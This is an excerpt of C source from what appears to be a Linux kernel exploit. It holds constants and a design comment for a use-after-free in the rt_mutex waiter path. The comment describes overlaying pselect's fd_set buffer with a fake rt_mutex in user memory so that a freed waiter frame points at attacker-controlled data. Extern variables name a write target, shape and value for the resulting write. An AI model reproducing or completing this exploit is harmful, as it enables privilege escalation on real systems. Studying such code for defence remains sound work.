...
#define FAKE_WAITER_PI_TREE_PRIO 0x7FFFFFFF
...
#define CONSUMER_MAX_CALLS 40
#define PSELECT_ROUTE_NFDS 64
#define PSELECT_CONSUMER_NICE 19
#define PSELECT_CONSUMER_BURST_CALLS 40
#define PSELECT_ENTER_DELAY_USEC 20000
...
/*
 * Userland object used as pselect readfds AND fake rt_mutex.
 * Layout (bytes):
 *   [0, fdset_bytes)      : zeroed fd_set bit window scanned by pselect
 *   +0x00 relative lock   : wait_lock  (must be 0)
 *   +0x08                 : waiters.rb_node
 *   +0x10                 : waiters.rb_leftmost
 *   +0x18                 : owner
 * We place lock fields AFTER the fd_set window by using a larger buffer and
 * pointing waiter->lock at (buf + fdset_bytes). pselect still receives buf
 * as readfds so its pointer lands in the UAF waiter frame; we then need the
 * saved pointer to be (buf+fdset_bytes). That only works if we pass
 * (fd_set*)(pselect_user_lock + LOCK_FIELDS_OFF/8) and also ensure core
 * stack still gets that exact pointer.
 *
 * Simpler approach used in code: pass &pselect_user_lock as readfds (pointer
 * value = lock base), keep first 32 bytes as lock fields, and only use small
 * nfds so pselect bit-walk stays in a range we fully materialize / leave clear.
 */
...
extern uint64_t pselect_write_target;
extern uint64_t pselect_write_shape;
extern uint32_t pselect_write_value;
